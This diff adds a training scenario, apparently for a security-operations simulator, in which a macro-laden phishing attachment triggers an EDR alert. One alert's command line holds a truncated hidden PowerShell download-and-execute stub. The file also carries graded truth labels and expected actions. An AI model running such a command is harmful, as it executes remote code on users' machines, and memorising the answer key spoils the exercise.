@@ -1,0 +1,147 @@
+{
+  "id": "sc-065",
+  "title": "Shift 065 - Night Shift",
+  "category": "Malware",
+  "outcome": "true_positive",
+  "difficulty": "Tier 1",
+  "briefing": "A user opened an email attachment.",
+  "startTime": "22:00:00",
+  "context": {
+    "change_calendar": [],
+    "notices": []
+  },
+  "assets": {
+    "users": {
+      "y.farouk": "EXEC-PC-20"
+    }
+  },
+  "alerts": [
+    {
+      "at": 0,
+      "severity": "Medium",
+      "rule": "Email: macro-enabled attachment",
+      "source": "Email Gateway",
+      "host": "EXEC-PC-20",
+      "user": "y.farouk",
+      "summary": "Macro-enabled attachment Shipment_Details.docm delivered from login-online-site.co",
+      "details": {
+        "email_from": "accounts@login-online-site.co",
+        "email_to": "y.farouk@corp.example",
+        "subject": "Unusual sign-in activity on your account",
+        "file_name": "Shipment_Details.docm",
+        "file_hash": "111e423173a9e8ef094dcfa5da36a4f4bc0459919960e2a8a421a5d5578ae66e",
+        "action_taken": "Delivered",
+        "raw_log": "mail from=accounts@login-online-site.co attach=Shipment_Details.docm macro=yes spf=softfail"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1566.001"
+      },
+      "id": "A-1001"
+    },
+    {
+      "at": 2,
+      "severity": "Medium",
+      "rule": "EDR: Office spawned command interpreter",
+      "source": "EDR",
+      "host": "EXEC-PC-20",
+      "user": "y.farouk",
+      "summary": "WINWORD.EXE spawned cmd.exe on EXEC-PC-20; EDR blocked the process tree",
+      "details": {
+        "host_ip": "10.17.224.45",
+        "process": "cmd.exe",
+        "parent_process": "WINWORD.EXE",
+        "file_name": "Shipment_Details.docm",
+        "command_line": "cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient)...",
+        "action_taken": "Blocked (process killed)",
+        "raw_log": "EDR block parent=WINWORD.EXE child=cmd.exe host=EXEC-PC-20"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1059"
+      },
+      "id": "A-1002"
+    }
+  ],
+  "logs": [
+    {
+      "t": "21:57:54",
+      "src": "proxy",
+      "host": "SALES-PC-33",
+      "user": "o.adel",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "22:02:00",
+      "src": "edr",
+      "host": "EXEC-PC-20",
+      "user": "y.farouk",
+      "msg": "Blocked: WINWORD.EXE -> cmd.exe (process tree terminated)"
+    },
+    {
+      "t": "22:02:54",
+      "src": "windows",
+      "host": "HR-PC-21",
+      "user": "r.zaki",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "22:04:28",
+      "src": "dns",
+      "host": "SALES-PC-08",
+      "user": "d.gamal",
+      "msg": "query intranet.corp.example A NOERROR"
+    },
+    {
+      "t": "22:08:00",
+      "src": "windows",
+      "host": "SALES-PC-09",
+      "user": "s.fathy",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "22:12:36",
+      "src": "proxy",
+      "host": "FIN-PC-04",
+      "user": "d.mansour",
+      "msg": "GET https://intranet.corp.example/home 200"
+    },
+    {
+      "t": "22:16:25",
+      "src": "windows",
+      "host": "FIN-PC-39",
+      "user": "o.fathy",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "22:23:55",
+      "src": "proxy",
+      "host": "EXEC-PC-40",
+      "user": "r.samir",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "22:29:27",
+      "src": "dns",
+      "host": "EXEC-PC-01",
+      "user": "h.hassan",
+      "msg": "query intranet.corp.example A NOERROR"
+    }
+  ],
+  "iocs": {
+    "111e423173a9e8ef094dcfa5da36a4f4bc0459919960e2a8a421a5d5578ae66e": {
+      "type": "hash",
+      "reputation": "malicious",
+      "note": "Malicious macro downloader document"
+    }
+  },
+  "expected_actions": [
+    "delete_email",
+    "block_hash:111e423173a9e8ef094dcfa5da36a4f4bc0459919960e2a8a421a5d5578ae66e",
+    "scan_host"
+  ]
+}
